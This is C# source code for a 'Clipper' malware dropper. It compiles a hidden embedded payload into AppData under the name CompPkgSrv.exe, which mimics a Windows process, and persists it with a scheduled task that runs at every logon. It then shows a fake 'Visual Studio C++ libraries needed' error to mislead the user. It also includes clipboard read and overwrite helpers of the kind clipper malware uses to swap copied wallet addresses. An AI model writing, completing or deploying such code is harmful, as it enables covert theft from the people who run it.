using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.CodeDom;
using System.Reflection;
using System.Xml;
using Microsoft.Win32.TaskScheduler;
using System.Security.Cryptography;

namespace Clipper
{
    internal class Program
    {
        static string name = "CompPkgSrv.exe";
        static void Main(string[] args)
        {
            if (StartCheck() == true)
            {
                System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
                {
                    Compile(HvN9xC1PAr.Properties.Resources.LKaoNhpaHsf);
                });
                CopyTask.Wait();
                Thread.Sleep(1000);
                Startup();
                Error();
            }
            else
            {
                Error();
            }

        }
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    try
                    {
                        System.Windows.Forms.Clipboard.SetText(txt);
                    }
                    catch
                    { }
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
        public static void Compile(string code)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),name);
            parameters.CompilerOptions = "/target:winexe";
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Threading.dll");

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
        }
        public static void Startup()
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Task to execute application";
                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),name)));
                td.Triggers.Add(new LogonTrigger());
                ts.RootFolder.RegisterTaskDefinition("Application Execution Task", td);
                ts.GetTask("Application Execution Task").Run();
            }
        }
        public static bool StartCheck()
        {
            if (File.Exists(Path.Combine(System.Windows.Forms.Application.StartupPath, "Leaf.xNet.dll")))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public static void Error()
        {
            System.Windows.Forms.MessageBox.Show("The following information was found for this error:\r\n\r\nCode:\r\n  0x129838F8F\r\n\r\nDescription:\r\n  Visual Studio C++ libraries needed", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
      
    }
}
